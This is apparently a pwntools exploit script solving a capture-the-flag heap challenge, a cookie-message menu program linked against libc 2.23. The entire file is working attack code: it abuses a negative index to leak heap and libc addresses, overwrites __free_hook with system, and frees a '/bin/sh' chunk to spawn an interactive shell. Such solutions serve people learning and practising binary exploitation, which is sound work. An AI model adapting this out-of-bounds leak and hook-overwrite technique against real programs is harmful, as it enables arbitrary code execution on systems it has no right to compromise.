from pwn import * 

binary = "./chall_patched"
p = process(binary)
s = '''
b * read_cookie+106
b edit_cookie
b * edit_cookie+177
'''
libc = ELF("./libc-2.23.so")
gdb.attach(p, s)
#---

def eat():
    p.sendlineafter(">", '1')
def create(size, data):
    p.sendlineafter(">", '2')
    p.sendlineafter("How long is the message?", str(size))
    p.sendlineafter("Input your message:", data)
def edit(idx, data):
    p.sendlineafter(">", '3')
    p.sendlineafter("Which cookie?", str(idx))
    p.sendafter("New Message:", data)
def show(idx):
    p.sendlineafter(">", '4')
    p.sendlineafter("Which cookie?", str(idx))

#print(p.recvline())
show(-11)
p.recv(7)
leak = u64(p.recv(6).ljust(8, b'\x00'))
info(f"leak: {hex(leak)}")
for i in range(27):
    create(0x88, b"/bin/sh\x00")

target = leak + 0x80
edit(-11, p64(target))
edit(-11, p64(target-0x68))
show(5)
p.recv(8)
#input()
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x3c5620
info(f"libc_base: {hex(libc_base)}")
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

edit(-11, p64(free_hook))
edit(5, p64(system))
eat()


p.interactive()
